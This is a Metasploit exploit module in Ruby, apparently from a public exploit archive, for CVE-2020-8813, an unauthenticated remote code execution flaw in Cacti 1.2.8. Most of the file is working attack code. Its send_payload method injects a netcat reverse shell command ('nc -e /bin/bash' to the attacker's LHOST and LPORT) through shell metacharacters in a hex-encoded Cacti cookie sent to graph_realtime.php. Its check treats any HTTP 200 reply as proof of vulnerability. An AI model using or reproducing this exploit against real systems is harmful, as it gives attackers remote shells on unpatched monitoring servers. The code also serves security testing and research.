# Exploit Author: Lucas Amorim (sh286)s
# CVE: CVE-2020-8813
# Vendor Homepage: https://cacti.net/
# Version: v1.2.8
# Tested on: Linux
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Cacti v1.2.8 Unauthenticated Remote Code Execution&#039;,
      &#039;Description&#039; => %q{graph_realtime.php in Cacti 1.2.8 allows remote attackers to 
        execute arbitrary OS commands via shell metacharacters in a cookie, if a guest user has 
        the graph real-time privilege.},
      &#039;Author&#039; =>
        [
          &#039;Lucas Amorim &#039; # MSF module
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;Platform&#039; => &#039;php&#039;,
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2020-8813&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Feb 21 2020&#039;,
      &#039;Privileged&#039; => true,
      &#039;DefaultOptions&#039; => {
        &#039;SSL&#039; => true,
      },
      &#039;Targets&#039; => [
        [&#039;Automatic&#039;, {}]
      ],
      &#039;DefaultTarget&#039;   => 0))

      register_options(
        [
          Opt::RPORT(443),
          OptString.new(&#039;RPATH&#039;, [ false, "path to cacti", "" ])
        ])

        deregister_options(&#039;VHOST&#039;)
  end

  def check
    res = send_request_raw(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => "#{datastore[&#039;RPATH&#039;]}/graph_realtime.php?action=init"
    )

    if res && res.code == 200
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def send_payload()
    exec_payload=(";nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s" % [datastore[&#039;LHOST&#039;], datastore[&#039;LPORT&#039;]])
    send_request_raw(
      &#039;uri&#039; => "#{datastore[&#039;RPATH&#039;]}/graph_realtime.php?action=init",
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => "Cacti=#{Rex::Text.uri_encode(exec_payload, mode = &#039;hex-normal&#039;)}"
    )
  end

  def exploit
    if check == Exploit::CheckCode::Vulnerable
      print_good("Target seems to be a vulnerable")
      send_payload()
    else
      print_error("Target does not seem to be vulnerable. Will exit now...")
    end
  end
end

